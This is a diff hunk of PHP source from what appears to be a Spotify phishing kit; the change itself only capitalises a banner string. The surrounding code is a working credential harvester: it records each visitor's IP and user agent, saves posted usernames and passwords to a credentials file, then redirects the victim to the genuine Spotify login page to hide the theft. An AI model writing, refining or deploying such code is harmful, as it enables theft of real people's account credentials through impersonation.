@@ -118,14 +118,14 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $filename = "../credentials.txt";
 
-$data = "\n|-------------------Spotify-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
+$data = "\n|-------------------SPOTIFY-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
 file_put_contents($filename, $data, FILE_APPEND);
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------Spotify-------------------|\n";
+    $data = "User: " . $username . "\n" . "Pass: " . $password . "\n|-------------------SPOTIFY-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
     header("Location: https://www.spotify.com/login");
 }
